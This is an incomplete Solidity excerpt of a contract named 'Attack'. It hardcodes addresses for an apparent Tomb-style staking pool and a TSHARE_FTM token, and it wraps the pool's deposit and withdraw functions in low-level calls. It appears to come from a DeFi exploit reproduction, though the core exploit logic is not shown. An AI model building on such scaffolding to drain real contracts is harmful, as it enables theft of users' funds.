...
contract Attack {
    ...
    address public tomb = 0xcc0a87F7e7c693042a9Cc703661F5060c80ACb43;

    address public TSHARE_FTM = 0x4733bc45eF91cF7CcEcaeeDb794727075fB209F2;
    ...
    function deposit() external {
        bytes memory payload = abi.encodeWithSignature("deposit(uint256,uint256)", 1, IERC20(TSHARE_FTM).balanceOf(address(this)));
        (bool success, ) = tomb.call(payload);
        require(success, "deposit failed");
    }

    function withdrawFromTromb(uint256 _withDrawAmount) public{
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256,uint256)", 1, _withDrawAmount);
        (bool success,) = tomb.call(payload);
